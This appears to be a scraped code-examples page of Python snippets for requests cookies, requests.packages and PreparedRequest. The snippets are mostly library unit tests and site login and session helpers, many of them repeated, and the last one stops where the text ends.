        assert prepared_request.headers['Cookie'] == 'foo=bar' 
**************************************
def touch(self):
        if 'xq_a_token' not in self.cookies:
            self.read_anony_cookies()
            if 'xq_a_token' not in self.cookies:
                log.debug('touch ' + urls.base)
                self.get(urls.base)
                self.save_cookies() 
**************************************
def login(self, username, password):
        self.cookies = RequestsCookieJar()
        log.debug('before login, first visit ' + urls.base)
        self.get(urls.base)
        password = hashlib.md5(password.encode('utf-8')).hexdigest()
        if re.search('^[\d]+$', username):
            data = {'areacode': 86, 'telephone': username, 'password': password, 'remember_me': 'on'}
        else:
            data = {'username': username, 'password': password}
        log.debug('login with ' + username + ' via ' + urls.login)
        resp = self.post(urls.login, data = data)
        if not self.is_login():
            raise LoginError(username + ' login failed.')
        self.save_cookies() 
**************************************
def is_login(self):
        return ('u' in self.cookies and
                'xq_a_token' in self.cookies and 
                'xq_r_token' in self.cookies and 
                'xq_is_login' in self.cookies and
                self.cookies['xq_is_login'] == '1') 
**************************************
def save_cookies(self):
        if self.is_login():
            fp = os.path.join(os.path.expanduser('~'), self.file_login_cookies)
        else:
            fp = os.path.join(os.path.expanduser('~'), self.file_anony_cookies)
        with open(fp, 'w') as fo:
            json.dump(dict_from_cookiejar(self.cookies), fo) 
**************************************
def _read_cookies(self, login = True):
        fp = os.path.join(os.path.expanduser('~'), self.file_login_cookies if login else self.file_anony_cookies)
        if os.path.exists(fp):
            with open(fp) as fo:
                self.cookies = cookiejar_from_dict(json.load(fo)) 
**************************************
def get_session(self):
        if not self.sess:
            self.sess = requests.Session()
        self.sess.cookies = cookiejar_from_dict({})
        return self.sess 
**************************************
def send_req(url,headers,data,remember_token,post_type):
	str_json = json.dumps(data)
	up = urlparse.urlparse(url)
	org_headers = {
		"Accept": "*/*",
		"Accept-Encoding": "br, gzip, deflate",
		"Accept-Language": "zh-Hans-CN;q=1",
		"Connection": "keep-alive",
		"Content-Length": str(len(str_json)),
		"Content-Type": 
		"application/json; charset=utf-8",
		"Host": up.netloc,
		"User-Agent": "Forest/342 (iPhone; iOS 12.1.2; Scale/3.00)"
	}
	final_headers = org_headers.copy()
	if headers :
		final_headers.update(headers)

	cookie_jar = RequestsCookieJar()
	if len(remember_token):
		cookie_jar.set("remember_token",remember_token, domain=up.netloc)
	if post_type.upper() == 'POST':
		res = requests.post(url,data=str_json,headers=final_headers,cookies=cookie_jar)
	elif post_type.upper() == 'PUT':
		res = requests.put(url,data=str_json,headers=final_headers,cookies=cookie_jar)
	elif post_type.upper() == 'GET':
		res = requests.get(url,data=str_json,headers=final_headers,cookies=cookie_jar)
	else:
		print('TypeErr')
	dict_json = json_dic(res.text)
	#if res.status_code != requests.codes.ok:	
	return dict_json 
**************************************
def send_req(url,headers,data,remember_token,post_type):
	str_json = json.dumps(data)
	up = urllib.parse.urlparse(url)
	org_headers = {
		"Accept": "*/*",
		"Accept-Encoding": "br, gzip, deflate",
		"Accept-Language": "zh-Hans-CN;q=1",
		"Connection": "keep-alive",
		"Content-Length": str(len(str_json)),
		"Content-Type": 
		"application/json; charset=utf-8",
		"Host": up.netloc,
		"User-Agent": "Forest/342 (iPhone; iOS 12.1.2; Scale/3.00)"
	}
	final_headers = org_headers.copy()
	if headers :
		final_headers.update(headers)

	cookie_jar = RequestsCookieJar()
	if len(remember_token):
		cookie_jar.set("remember_token",remember_token, domain=up.netloc)
	if post_type.upper() == 'POST':
		res = requests.post(url,data=str_json,headers=final_headers,cookies=cookie_jar)
	elif post_type.upper() == 'PUT':
		res = requests.put(url,data=str_json,headers=final_headers,cookies=cookie_jar)
	elif post_type.upper() == 'GET':
		res = requests.get(url,data=str_json,headers=final_headers,cookies=cookie_jar)
	else:
		print('TypeErr')
	dict_json = json_dic(res.text)
	#if res.status_code != requests.codes.ok:	
	return dict_json 
**************************************
def test_set_cookie_on_301(self, httpbin):
        s = requests.session()
        url = httpbin('cookies/set?foo=bar')
        s.get(url)
        assert s.cookies['foo'] == 'bar' 
**************************************
def test_cookie_sent_on_redirect(self, httpbin):
        s = requests.session()
        s.get(httpbin('cookies/set?foo=bar'))
        r = s.get(httpbin('redirect/1'))  # redirects to httpbin('get')
        assert 'Cookie' in r.json()['headers'] 
**************************************
def test_cookie_removed_on_expire(self, httpbin):
        s = requests.session()
        s.get(httpbin('cookies/set?foo=bar'))
        assert s.cookies['foo'] == 'bar'
        s.get(
            httpbin('response-headers'),
            params={
                'Set-Cookie':
                    'foo=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT'
            }
        )
        assert 'foo' not in s.cookies 
**************************************
def test_cookie_quote_wrapped(self, httpbin):
        s = requests.session()
        s.get(httpbin('cookies/set?foo="bar:baz"'))
        assert s.cookies['foo'] == '"bar:baz"' 
**************************************
def test_cookie_persists_via_api(self, httpbin):
        s = requests.session()
        r = s.get(httpbin('redirect/1'), cookies={'foo': 'bar'})
        assert 'foo' in r.request.headers['Cookie']
        assert 'foo' in r.history[0].request.headers['Cookie'] 
**************************************
def test_request_cookies_not_persisted(self, httpbin):
        s = requests.session()
        s.get(httpbin('cookies'), cookies={'foo': 'baz'})
        # Sending a request with cookies should not add cookies to the session
        assert not s.cookies 
**************************************
def test_generic_cookiejar_works(self, httpbin):
        cj = cookielib.CookieJar()
        cookiejar_from_dict({'foo': 'bar'}, cj)
        s = requests.session()
        s.cookies = cj
        r = s.get(httpbin('cookies'))
        # Make sure the cookie was sent
        assert r.json()['cookies']['foo'] == 'bar'
        # Make sure the session cj is still the custom one
        assert s.cookies is cj 
**************************************
def test_param_cookiejar_works(self, httpbin):
        cj = cookielib.CookieJar()
        cookiejar_from_dict({'foo': 'bar'}, cj)
        s = requests.session()
        r = s.get(httpbin('cookies'), cookies=cj)
        # Make sure the cookie was sent
        assert r.json()['cookies']['foo'] == 'bar' 
**************************************
def test_DIGEST_AUTH_RETURNS_COOKIE(self, httpbin):
        url = httpbin('digest-auth', 'auth', 'user', 'pass')
        auth = HTTPDigestAuth('user', 'pass')
        r = requests.get(url)
        assert r.cookies['fake'] == 'fake_value'

        r = requests.get(url, auth=auth)
        assert r.status_code == 200 
**************************************
def test_DIGEST_AUTH_SETS_SESSION_COOKIES(self, httpbin):
        url = httpbin('digest-auth', 'auth', 'user', 'pass')
        auth = HTTPDigestAuth('user', 'pass')
        s = requests.Session()
        s.get(url, auth=auth)
        assert s.cookies['fake'] == 'fake_value' 
**************************************
def test_cookie_as_dict_keys(self):
        key = 'some_cookie'
        value = 'some_value'

        key1 = 'some_cookie1'
        value1 = 'some_value1'

        jar = requests.cookies.RequestsCookieJar()
        jar.set(key, value)
        jar.set(key1, value1)

        keys = jar.keys()
        assert keys == list(keys)
        # make sure one can use keys multiple times
        assert list(keys) == list(keys) 
**************************************
def test_cookie_as_dict_values(self):
        key = 'some_cookie'
        value = 'some_value'

        key1 = 'some_cookie1'
        value1 = 'some_value1'

        jar = requests.cookies.RequestsCookieJar()
        jar.set(key, value)
        jar.set(key1, value1)

        values = jar.values()
        assert values == list(values)
        # make sure one can use values multiple times
        assert list(values) == list(values) 
**************************************
def test_cookie_as_dict_items(self):
        key = 'some_cookie'
        value = 'some_value'

        key1 = 'some_cookie1'
        value1 = 'some_value1'

        jar = requests.cookies.RequestsCookieJar()
        jar.set(key, value)
        jar.set(key1, value1)

        items = jar.items()
        assert items == list(items)
        # make sure one can use items multiple times
        assert list(items) == list(items) 
**************************************
def test_cookie_duplicate_names_raises_cookie_conflict_error(self):
        key = 'some_cookie'
        value = 'some_value'
        path = 'some_path'

        jar = requests.cookies.RequestsCookieJar()
        jar.set(key, value, path=path)
        jar.set(key, value)
        with pytest.raises(requests.cookies.CookieConflictError):
            jar.get(key) 
**************************************
def __init__(self, order_of_redirects):
        self.redirects = order_of_redirects
        self.calls = []
        self.max_redirects = 30
        self.cookies = {}
        self.trust_env = False 
**************************************
def test_set_cookie_on_301(self, httpbin):
        s = requests.session()
        url = httpbin('cookies/set?foo=bar')
        s.get(url)
        assert s.cookies['foo'] == 'bar' 
**************************************
def test_cookie_sent_on_redirect(self, httpbin):
        s = requests.session()
        s.get(httpbin('cookies/set?foo=bar'))
        r = s.get(httpbin('redirect/1'))  # redirects to httpbin('get')
        assert 'Cookie' in r.json()['headers'] 
**************************************
def test_cookie_removed_on_expire(self, httpbin):
        s = requests.session()
        s.get(httpbin('cookies/set?foo=bar'))
        assert s.cookies['foo'] == 'bar'
        s.get(
            httpbin('response-headers'),
            params={
                'Set-Cookie':
                    'foo=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT'
            }
        )
        assert 'foo' not in s.cookies 
**************************************
def test_cookie_persists_via_api(self, httpbin):
        s = requests.session()
        r = s.get(httpbin('redirect/1'), cookies={'foo': 'bar'})
        assert 'foo' in r.request.headers['Cookie']
        assert 'foo' in r.history[0].request.headers['Cookie'] 
**************************************
def test_request_cookie_overrides_session_cookie(self, httpbin):
        s = requests.session()
        s.cookies['foo'] = 'bar'
        r = s.get(httpbin('cookies'), cookies={'foo': 'baz'})
        assert r.json()['cookies']['foo'] == 'baz'
        # Session cookie should not be modified
        assert s.cookies['foo'] == 'bar' 
**************************************
def test_request_cookies_not_persisted(self, httpbin):
        s = requests.session()
        s.get(httpbin('cookies'), cookies={'foo': 'baz'})
        # Sending a request with cookies should not add cookies to the session
        assert not s.cookies 
**************************************
def test_generic_cookiejar_works(self, httpbin):
        cj = cookielib.CookieJar()
        cookiejar_from_dict({'foo': 'bar'}, cj)
        s = requests.session()
        s.cookies = cj
        r = s.get(httpbin('cookies'))
        # Make sure the cookie was sent
        assert r.json()['cookies']['foo'] == 'bar'
        # Make sure the session cj is still the custom one
        assert s.cookies is cj 
**************************************
def test_param_cookiejar_works(self, httpbin):
        cj = cookielib.CookieJar()
        cookiejar_from_dict({'foo': 'bar'}, cj)
        s = requests.session()
        r = s.get(httpbin('cookies'), cookies=cj)
        # Make sure the cookie was sent
        assert r.json()['cookies']['foo'] == 'bar' 
**************************************
def test_DIGEST_AUTH_SETS_SESSION_COOKIES(self, httpbin):
        url = httpbin('digest-auth', 'auth', 'user', 'pass')
        auth = HTTPDigestAuth('user', 'pass')
        s = requests.Session()
        s.get(url, auth=auth)
        assert s.cookies['fake'] == 'fake_value' 
**************************************
def test_cookie_as_dict_keys(self):
        key = 'some_cookie'
        value = 'some_value'

        key1 = 'some_cookie1'
        value1 = 'some_value1'

        jar = requests.cookies.RequestsCookieJar()
        jar.set(key, value)
        jar.set(key1, value1)

        keys = jar.keys()
        assert keys == list(keys)
        # make sure one can use keys multiple times
        assert list(keys) == list(keys) 
**************************************
def test_cookie_as_dict_items(self):
        key = 'some_cookie'
        value = 'some_value'

        key1 = 'some_cookie1'
        value1 = 'some_value1'

        jar = requests.cookies.RequestsCookieJar()
        jar.set(key, value)
        jar.set(key1, value1)

        items = jar.items()
        assert items == list(items)
        # make sure one can use items multiple times
        assert list(items) == list(items) 
**************************************
def test_cookie_duplicate_names_different_domains(self):
        key = 'some_cookie'
        value = 'some_value'
        domain1 = 'test1.com'
        domain2 = 'test2.com'

        jar = requests.cookies.RequestsCookieJar()
        jar.set(key, value, domain=domain1)
        jar.set(key, value, domain=domain2)
        assert key in jar
        items = jar.items()
        assert len(items) == 2

        # Verify that CookieConflictError is raised if domain is not specified
        with pytest.raises(requests.cookies.CookieConflictError):
            jar.get(key)

        # Verify that CookieConflictError is not raised if domain is specified
        cookie = jar.get(key, domain=domain1)
        assert cookie == value 
**************************************
def test_cookie_duplicate_names_raises_cookie_conflict_error(self):
        key = 'some_cookie'
        value = 'some_value'
        path = 'some_path'

        jar = requests.cookies.RequestsCookieJar()
        jar.set(key, value, path=path)
        jar.set(key, value)
        with pytest.raises(requests.cookies.CookieConflictError):
            jar.get(key) 
**************************************
def __init__(self, order_of_redirects):
        self.redirects = order_of_redirects
        self.calls = []
        self.max_redirects = 30
        self.cookies = {}
        self.trust_env = False 
**************************************
def test_set_cookie_on_301(self):
        s = requests.session()
        url = httpbin('cookies/set?foo=bar')
        s.get(url)
        assert s.cookies['foo'] == 'bar' 
**************************************
def test_cookie_sent_on_redirect(self):
        s = requests.session()
        s.get(httpbin('cookies/set?foo=bar'))
        r = s.get(httpbin('redirect/1'))  # redirects to httpbin('get')
        assert 'Cookie' in r.json()['headers'] 
**************************************
def test_cookie_removed_on_expire(self):
        s = requests.session()
        s.get(httpbin('cookies/set?foo=bar'))
        assert s.cookies['foo'] == 'bar'
        s.get(
            httpbin('response-headers'),
            params={
                'Set-Cookie':
                    'foo=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT'
            }
        )
        assert 'foo' not in s.cookies 
**************************************
def test_cookie_quote_wrapped(self):
        s = requests.session()
        s.get(httpbin('cookies/set?foo="bar:baz"'))
        assert s.cookies['foo'] == '"bar:baz"' 
**************************************
def test_cookie_persists_via_api(self):
        s = requests.session()
        r = s.get(httpbin('redirect/1'), cookies={'foo': 'bar'})
        assert 'foo' in r.request.headers['Cookie']
        assert 'foo' in r.history[0].request.headers['Cookie'] 
**************************************
def test_request_cookies_not_persisted(self):
        s = requests.session()
        s.get(httpbin('cookies'), cookies={'foo': 'baz'})
        # Sending a request with cookies should not add cookies to the session
        assert not s.cookies 
**************************************
def test_generic_cookiejar_works(self):
        cj = cookielib.CookieJar()
        cookiejar_from_dict({'foo': 'bar'}, cj)
        s = requests.session()
        s.cookies = cj
        r = s.get(httpbin('cookies'))
        # Make sure the cookie was sent
        assert r.json()['cookies']['foo'] == 'bar'
        # Make sure the session cj is still the custom one
        assert s.cookies is cj 
**************************************
def test_param_cookiejar_works(self):
        cj = cookielib.CookieJar()
        cookiejar_from_dict({'foo': 'bar'}, cj)
        s = requests.session()
        r = s.get(httpbin('cookies'), cookies=cj)
        # Make sure the cookie was sent
        assert r.json()['cookies']['foo'] == 'bar' 
**************************************
def test_DIGEST_AUTH_RETURNS_COOKIE(self):
        url = httpbin('digest-auth', 'auth', 'user', 'pass')
        auth = HTTPDigestAuth('user', 'pass')
        r = requests.get(url)
        assert r.cookies['fake'] == 'fake_value'

        r = requests.get(url, auth=auth)
        assert r.status_code == 200 
**************************************
def test_DIGEST_AUTH_SETS_SESSION_COOKIES(self):
        url = httpbin('digest-auth', 'auth', 'user', 'pass')
        auth = HTTPDigestAuth('user', 'pass')
        s = requests.Session()
        s.get(url, auth=auth)
        assert s.cookies['fake'] == 'fake_value' 
**************************************
def test_cookie_as_dict_keys(self):
        key = 'some_cookie'
        value = 'some_value'

        key1 = 'some_cookie1'
        value1 = 'some_value1'

        jar = requests.cookies.RequestsCookieJar()
        jar.set(key, value)
        jar.set(key1, value1)

        keys = jar.keys()
        assert keys == list(keys)
        # make sure one can use keys multiple times
        assert list(keys) == list(keys) 
**************************************
def test_cookie_as_dict_values(self):
        key = 'some_cookie'
        value = 'some_value'

        key1 = 'some_cookie1'
        value1 = 'some_value1'

        jar = requests.cookies.RequestsCookieJar()
        jar.set(key, value)
        jar.set(key1, value1)

        values = jar.values()
        assert values == list(values)
        # make sure one can use values multiple times
        assert list(values) == list(values) 
**************************************
def test_cookie_as_dict_items(self):
        key = 'some_cookie'
        value = 'some_value'

        key1 = 'some_cookie1'
        value1 = 'some_value1'

        jar = requests.cookies.RequestsCookieJar()
        jar.set(key, value)
        jar.set(key1, value1)

        items = jar.items()
        assert items == list(items)
        # make sure one can use items multiple times
        assert list(items) == list(items) 
**************************************
def test_prepared_request_complete_copy():
    p = PreparedRequest()
    p.prepare(
        method='GET',
        url='http://www.example.com',
        data='foo=bar',
        hooks=default_hooks(),
        cookies={'foo': 'bar'}
    )
    assert_copy(p, p.copy()) 
**************************************
def save_cookies(self, cookie_filter=None, default_expires=60 * 60 * 24 * 7):
        """
        Store the cookies from ``http`` in the plugin cache until they expire. The cookies can be filtered
        by supplying a filter method. eg. ``lambda c: "auth" in c.name``. If no expiry date is given in the
        cookie then the ``default_expires`` value will be used.

        :param cookie_filter: a function to filter the cookies
        :type cookie_filter: function
        :param default_expires: time (in seconds) until cookies with no expiry will expire
        :type default_expires: int
        :return: list of the saved cookie names
        """
        if not self.session or not self.cache:
            raise RuntimeError("Cannot cache cookies in unbound plugin")

        cookie_filter = cookie_filter or (lambda c: True)
        saved = []

        for cookie in filter(cookie_filter, self.session.http.cookies):
            cookie_dict = {}
            for attr in ("version", "name", "value", "port", "domain", "path", "secure", "expires", "discard",
                         "comment", "comment_url", "rfc2109"):
                cookie_dict[attr] = getattr(cookie, attr, None)
            cookie_dict["rest"] = getattr(cookie, "rest", getattr(cookie, "_rest", None))

            expires = default_expires
            if cookie_dict['expires']:
                expires = int(cookie_dict['expires'] - time.time())
            key = "__cookie:{0}:{1}:{2}:{3}".format(cookie.name,
                                                    cookie.domain,
                                                    cookie.port_specified and cookie.port or "80",
                                                    cookie.path_specified and cookie.path or "*")
            self.cache.set(key, cookie_dict, expires)
            saved.append(cookie.name)

        if saved:
            self.logger.debug("Saved cookies: {0}".format(", ".join(saved)))
        return saved 
**************************************
def __init__(self, email, password=None, cookie=None):
        self.email = email
        self.cookies = RequestsCookieJar()
        if password is None:
            temp_cookie = SimpleCookie()
            temp_cookie.load(cookie)
            for key, morsel in temp_cookie.items():
                self.cookies[key] = morsel.value
            self.cookie = True
        else:
            self.password = password
            self.cookie = False 
**************************************
def preLogin(self, useProxy=False):
        res = self.get(c.hostURL, useProxy=useProxy)
        # Get Login URL
        index = res.text.index("WindowsLiveId")  # Find URL
        cutText = res.text[index + 16:]  # Cut Text at Start of URL
        loginURL = cutText[:cutText.index("\"")]  # Cut at End of URL
        # Unescape URL
        loginURL = bytes(loginURL, encoding="UTF-8").decode("unicode_escape")
        # Get Login Cookies
        self.headers["Host"] = c.loginHost  # Set Host to Login Server
        res = self.get(loginURL, useProxy=useProxy)
        self.data = self.getAuthData()
        self.cookies["CkTst"] = "G" + \
            str(int(time.time() * 1000))  # Add Time Cookie
        # Get Post URL
        index = res.text.index(c.loginPostURL)  # Find URL
        cutText = res.text[index:]  # Cut Text at Start of URL
        postURL = cutText[:cutText.index("\'")]  # Cut at End of URL
        # Get PPFT
        index = res.text.index("sFTTag")  # Find PPFT
        cutText = res.text[index:]  # Cut Text Near PPFT
        PPFT = cutText[cutText.index(
            "value=") + 7:cutText.index("\"/>")]  # Cut PPFT
        self.data["PPFT"] = PPFT
        # Get PPSX
        index = res.text.index(",bH:\'")  # Find PPSX
        cutText = res.text[index + 4:]  # Cut Text at Start of PPSX
        PPSX = cutText[:cutText.index("\'")]  # Cut at End of PPSX
        self.data["PPSX"] = PPSX
        # Finish Up
        self.cookies["wlidperf"] = "FR=L&ST=" + \
            str(int(time.time() * 1000))  # Add Another Time Cookie
        return postURL 
**************************************
def logout(self):
        if not self.cookie:
            self.cookies.clear() 
**************************************
def request(self, method, URL, headers=USE_SELF, cookies=USE_SELF, params=None, data=None, proxies=USE_SELF, useProxy=False, setReferer=True, setCookies=True):
        headers = self.headers if headers is USE_SELF else headers
        cookies = self.cookies if cookies is USE_SELF else cookies
        proxies = self.proxies if proxies is USE_SELF else proxies
        res = requests.request(method, URL, headers=headers, cookies=cookies,
                               params=params, data=data, proxies=proxies if useProxy else None)
        if setReferer:
            self.headers["Referer"] = URL
        if setCookies:
            self.cookies.update(res.cookies)
        return res 
**************************************
def post(self, URL, headers=USE_SELF, cookies=USE_SELF, params=None, data=None, proxies=USE_SELF, useProxy=False, setReferer=True, setCookies=True):
        return self.request('POST', URL, headers, cookies, params, data, proxies, useProxy, setReferer, setCookies) 
**************************************
def login(account, password, xsrf, captcha):
    account_type = "phone_num"
    url = "https://www.zhihu.com/login/phone_num"
    if re.match(r"^\S+\@\S+\.\S+$", account):
        account_type = "email"
        url = "https://www.zhihu.com/login/email"

    form = {account_type: account,
            "password": password,
            "remember_me": True,
            "_xsrf": xsrf,
            "captcha": captcha}

    headers = {
        'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
        'Host': "www.zhihu.com",
        'Origin': "https://www.zhihu.com",
        'Pragma': "no-cache",
        'Referer': "https://www.zhihu.com/",
        'X-Requested-With': "XMLHttpRequest"
    }

    r = requests.post(url, data=form, headers=headers, verify=False)
    if int(r.status_code) != 200:
        return {'status': False, 'msg': 'Login fail!'}

    if r.headers['content-type'].lower() == "application/json":
        try:
            result = json.loads(r.content)
        except Exception as e:
            result = {}
        if result["r"] == 0:
            requests.cookies.save()
            return {"status": True, 'msg': "Login success!"}
        elif result["r"] == 1:
            return {"status": False, 'msg': "Login fail!", 'code': int(result['errcode'])}
        else:
            return {"status": False, 'msg': "Login fail!"}
    else:
        return {"status": False, 'msg': "Unknown error!"} 
**************************************
def save_cookies(self, cookie_filter=None, default_expires=60 * 60 * 24 * 7):
        """
        Store the cookies from ``http`` in the plugin cache until they expire. The cookies can be filtered
        by supplying a filter method. eg. ``lambda c: "auth" in c.name``. If no expiry date is given in the
        cookie then the ``default_expires`` value will be used.

        :param cookie_filter: a function to filter the cookies
        :type cookie_filter: function
        :param default_expires: time (in seconds) until cookies with no expiry will expire
        :type default_expires: int
        :return: list of the saved cookie names
        """
        if not self.session or not self.cache:
            raise RuntimeError("Cannot cache cookies in unbound plugin")

        cookie_filter = cookie_filter or (lambda c: True)
        saved = []

        for cookie in filter(cookie_filter, self.session.http.cookies):
            cookie_dict = {}
            for attr in ("version", "name", "value", "port", "domain", "path", "secure", "expires", "discard",
                         "comment", "comment_url", "rfc2109"):
                cookie_dict[attr] = getattr(cookie, attr, None)
            cookie_dict["rest"] = getattr(cookie, "rest", getattr(cookie, "_rest", None))

            expires = default_expires
            if cookie_dict['expires']:
                expires = int(cookie_dict['expires'] - time.time())
            key = "__cookie:{0}:{1}:{2}:{3}".format(cookie.name,
                                                    cookie.domain,
                                                    cookie.port_specified and cookie.port or "80",
                                                    cookie.path_specified and cookie.path or "*")
            self.cache.set(key, cookie_dict, expires)
            saved.append(cookie.name)

        if saved:
            self.logger.debug("Saved cookies: {0}".format(", ".join(saved)))
        return saved 
**************************************
def get_response(session_name, requests_kwargs, config_dir, args,
                 read_only=False):
    """Like `client.get_response`, but applies permanent
    aspects of the session to the request.

    """
    if os.path.sep in session_name:
        path = os.path.expanduser(session_name)
    else:
        hostname = (
            requests_kwargs['headers'].get('Host', None)
            or urlsplit(requests_kwargs['url']).netloc.split('@')[-1]
        )

        assert re.match('^[a-zA-Z0-9_.:-]+$', hostname)

        # host:port => host_port
        hostname = hostname.replace(':', '_')
        path = os.path.join(config_dir,
                            SESSIONS_DIR_NAME,
                            hostname,
                            session_name + '.json')

    session = Session(path)
    session.load()

    request_headers = requests_kwargs.get('headers', {})
    requests_kwargs['headers'] = dict(session.headers, **request_headers)
    session.update_headers(request_headers)

    if args.auth:
        session.auth = {
            'type': args.auth_type,
            'username': args.auth.key,
            'password': args.auth.value,
        }
    elif session.auth:
        requests_kwargs['auth'] = session.auth

    requests_session = requests.Session()
    requests_session.cookies = session.cookies

    try:
        response = requests_session.request(**requests_kwargs)
    except Exception:
        raise
    else:
        # Existing sessions with `read_only=True` don't get updated.
        if session.is_new or not read_only:
            session.cookies = requests_session.cookies
            session.save()
        return response 
**************************************
def queueSpider(add_link_dictionary):
    # get download information from add_link_dictionary
    for i in ['link', 'header', 'out', 'user_agent', 'load_cookies', 'referer']:
        if not (i in add_link_dictionary):
            add_link_dictionary[i] = None

    link = add_link_dictionary['link']
    header = add_link_dictionary['header']
    user_agent = add_link_dictionary['user_agent']
    raw_cookies = add_link_dictionary['load_cookies']
    referer = add_link_dictionary['referer']

    requests_session = requests.Session()  # defining a requests Session

    if raw_cookies:  # set cookies
        cookie = SimpleCookie()
        cookie.load(raw_cookies)

        cookies = {key: morsel.value for key, morsel in cookie.items()}
        requests_session.cookies = cookiejar_from_dict(cookies)

    if referer:
        # set referer to the session
        requests_session.headers.update({'referer': referer})

    if user_agent:
        # set user_agent to the session
        requests_session.headers.update({'user-agent': user_agent})

    # find headers
    try:
        response = requests_session.head(link)
        header = response.headers
    except:
        header = {}
    filename = None
    if 'Content-Disposition' in header.keys():  # checking if filename is available
        content_disposition = header['Content-Disposition']
        if content_disposition.find('filename') != -1:
            filename_splited = content_disposition.split('filename=')
            filename_splited = filename_splited[-1]
            # getting file name in desired format
            filename = filename_splited[1:-1]

    if not(filename):
        filename = link.split('/')[-1]

    return filename 
**************************************
def addLinkSpider(add_link_dictionary):
    # get user's download information from add_link_dictionary
    for i in ['link', 'header', 'out', 'user_agent', 'load_cookies', 'referer']:
        if not (i in add_link_dictionary):
            add_link_dictionary[i] = None

    link = add_link_dictionary['link']
    header = add_link_dictionary['header']
    user_agent = add_link_dictionary['user_agent']
    raw_cookies = add_link_dictionary['load_cookies']
    referer = add_link_dictionary['referer']

    requests_session = requests.Session()  # defining a requests Session

    if raw_cookies:  # set cookies
        cookie = SimpleCookie()
        cookie.load(raw_cookies)

        cookies = {key: morsel.value for key, morsel in cookie.items()}
        requests_session.cookies = cookiejar_from_dict(cookies)

    if referer:
        # set referer to the session
        requests_session.headers.update({'referer': referer})

    if user_agent:
        # set user_agent to the session
        requests_session.headers.update({'user-agent': user_agent})

    # find headers
    try:
        response = requests_session.head(link)
        header = response.headers
    except:
        header = {}

    # find file size
    file_size = None
    if 'Content-Length' in header.keys():  # checking if file_size is available
        file_size = int(header['Content-Length'])

        # converting file_size to KiB or MiB or GiB
        file_size = str(humanReadbleSize(file_size))

    # find file name
    file_name = None
    if 'Content-Disposition' in header.keys():  # checking if filename is available
        content_disposition = header['Content-Disposition']
        if content_disposition.find('filename') != -1:
            filename_splited = content_disposition.split('filename=')
            filename_splited = filename_splited[-1]
            # getting file name in desired format
            file_name = str(filename_splited[1:-1])

    return file_name, file_size  # If no Content-Length ? fixed it. 

Python requests.packages() Examples

**************************************
def _new_session(retry_timeout_config):
        """
        Return a new `requests.Session` object.
        """
        retry = requests.packages.urllib3.Retry(
            total=None,
            connect=retry_timeout_config.connect_retries,
            read=retry_timeout_config.read_retries,
            method_whitelist=retry_timeout_config.method_whitelist,
            redirect=retry_timeout_config.max_redirects)
        session = requests.Session()
        session.mount('https://',
                      requests.adapters.HTTPAdapter(max_retries=retry))
        session.mount('http://',
                      requests.adapters.HTTPAdapter(max_retries=retry))
        return session 
**************************************
def test_urllib3_retries(httpbin):
    from requests.packages.urllib3.util import Retry
    s = requests.Session()
    s.mount('http://', HTTPAdapter(max_retries=Retry(
        total=2, status_forcelist=[500]
    )))

    with pytest.raises(RetryError):
        s.get(httpbin('status/500')) 
**************************************
def test_vendor_aliases():
    from requests.packages import urllib3
    from requests.packages import chardet

    with pytest.raises(ImportError):
        from requests.packages import webbrowser 
**************************************
def test_urllib3_retries(httpbin):
    from requests.packages.urllib3.util import Retry
    s = requests.Session()
    s.mount('http://', HTTPAdapter(max_retries=Retry(
        total=2, status_forcelist=[500]
    )))

    with pytest.raises(RetryError):
        s.get(httpbin('status/500')) 
**************************************
def test_vendor_aliases():
    from requests.packages import urllib3
    from requests.packages import chardet

    with pytest.raises(ImportError):
        from requests.packages import webbrowser 
**************************************
def disable_https_warning():
    """
    Agent does HTTPS requests with verify=False (only for checks, not
    for communication with Bleemeo Cloud platform).
    By default requests will emit one warning for EACH request which is
    too noisy.
    """

    # urllib3 may be unvendored from requests.packages (at least Debian
    # does this). Older version of requests don't have requests.packages at
    # all. Newer version have a stub that makes requests.packages.urllib3 being
    # urllib3.
    # Try first to access requests.packages.urllib3 (which should works on
    # recent Debian version and virtualenv version) and fallback to urllib3
    # directly.
    try:
        from requests.packages import urllib3
    except ImportError:
        import urllib3

    try:
        klass = urllib3.exceptions.InsecureRequestWarning
    except AttributeError:
        # urllib3 introduced warning with 1.9. Before InsecureRequestWarning
        # didn't existed.
        return

    urllib3.disable_warnings(klass) 
**************************************
def _pre_editor(self, response):
        for rec in response:
            rec['packages'] = ', '.join(rec['packages'])
        return response 
**************************************
def test_urllib3_retries(httpbin):
    from requests.packages.urllib3.util import Retry
    s = requests.Session()
    s.mount('http://', HTTPAdapter(max_retries=Retry(
        total=2, status_forcelist=[500]
    )))

    with pytest.raises(RetryError):
        s.get(httpbin('status/500')) 
**************************************
def test_vendor_aliases():
    from requests.packages import urllib3
    from requests.packages import chardet

    with pytest.raises(ImportError):
        from requests.packages import webbrowser 
**************************************
def __init__(self):
        self.state = Session.STATE_INIT
        self.credentials = None
        self.session = None
        self.auth = None
        self.retrying = False	# Avoid infinite loop when successful auth / unsuccessful query

        # yuck suppress InsecurePlatformWarning under Python < 2.7.9 which lacks SNI support
        if sys.version_info < (2,7,9):
            from requests.packages import urllib3
            urllib3.disable_warnings()

        if getattr(sys, 'frozen', False):
            os.environ['REQUESTS_CA_BUNDLE'] = join(config.respath, 'cacert.pem') 

Python requests.PreparedRequest() Examples

**************************************
def signer(self, identity_id):
        """
        Generates a request signer function for the
        the authorizing identity.

        >>> signer = api_client.signer(authorizing_identity)

        :param str identity_id: the authorizing identity id
        :return: the request signer function
        :rtype: (:class:`PreparedRequest`) -> :class:`PreparedRequest`
        """
        def sign_request(r):
            # type: (requests.PreparedRequest) -> requests.PreparedRequest
            signing_key = self.key_store.get_private_signing_key(identity_id)
            r.headers = signer.get_updated_headers(
                identity_id=identity_id,
                method=r.method,
                url=r.url,
                headers=r.headers,
                payload=r.body,
                private_signing_key=signing_key)
            return r
        return sign_request 
**************************************
def new_instance(self, api_data: VeraApiData) -> VeraControllerData:
        """Create new instance of controller."""
        base_url = "http://127.0.0.1:123"

        def callback(req: requests.PreparedRequest) -> ResponsesResponse:
            nonlocal api_data
            return handle_request(req, api_data)

        self.rsps.add_callback(
            method=responses.GET,
            url=re.compile(f"{base_url}/data_request?.*"),
            callback=callback,
            content_type="application/json",
        )

